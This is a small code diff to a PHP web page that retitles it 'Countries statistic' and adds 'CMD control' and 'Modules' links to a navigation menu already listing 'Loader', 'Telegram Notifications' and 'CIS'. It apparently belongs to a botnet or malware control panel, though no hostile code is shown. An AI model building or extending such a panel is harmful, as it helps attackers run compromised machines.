@@ -9,7 +9,7 @@ include('protect.php');
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
-    <title>Table</title>
+    <title>Countries statistic</title>
 
     <!-- Bootstrap -->
 
@@ -31,6 +31,8 @@ include('protect.php');
                     <li><a href="loader.php" style="color: black">Loader</a></li>
                     <li><a href="telegram.php" style="color: black">Telegram Notifications</a></li>
                     <li><a href="cis.php" style="color: black">CIS</a></li>
+                    <li><a href="comma.php" style="color: black">CMD control</a></li>
+                    <li><a href="modules.php" style="color: black">Modules</a></li>
 				<li><a href="logout.php" style="color: black">Logout</a></li>
                 
                 </ul>
